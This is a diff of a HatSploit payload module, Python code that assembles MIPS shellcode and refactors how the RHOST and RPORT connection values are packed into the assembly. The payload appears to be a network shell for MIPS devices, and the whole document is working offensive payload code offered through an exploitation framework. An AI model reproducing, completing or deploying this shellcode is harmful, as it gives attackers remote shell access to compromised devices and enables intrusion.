@@ -3,12 +3,12 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 from pex.assembler import Assembler
 from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, Assembler, Socket):
+class HatSploitPayload(Payload, Handler, Assembler, Socket):
     def __init__(self):
         super().__init__()
 
@@ -26,9 +26,6 @@ class HatSploitPayload(Payload, Assembler, Socket):
         }
 
     def run(self):
-        rhost = self.pack_host(self.handler['RHOST'])
-        rport = self.pack_port(self.handler['RPORT'])
-
         return self.assemble(
             self.details['Architecture'],
             f"""
@@ -46,11 +43,11 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 ori $t7, $zero, 0xfffd
                 not $t7, $t7
                 sw $t7, -0x20($sp)
-                lui $t6, 0x{rport.hex()}
-                ori $t6, $t6, 0x{rport.hex()}
+                lui $t6, 0x{self.rport.little.hex()}
+                ori $t6, $t6, 0x{self.rport.little.hex()}
                 sw $t6, -0x1c($sp)
-                lui $t6, 0x{rhost[2:].hex()}
-                ori $t6, $t6, 0x{rhost[:2].hex()}
+                lui $t6, 0x{self.rhost.little[2:].hex()}
+                ori $t6, $t6, 0x{self.rhost.little[:2].hex()}
                 sw $t6, -0x1a($sp)
                 addiu $a1, $sp, -0x1e
                 addiu $t4, $zero, -0x11
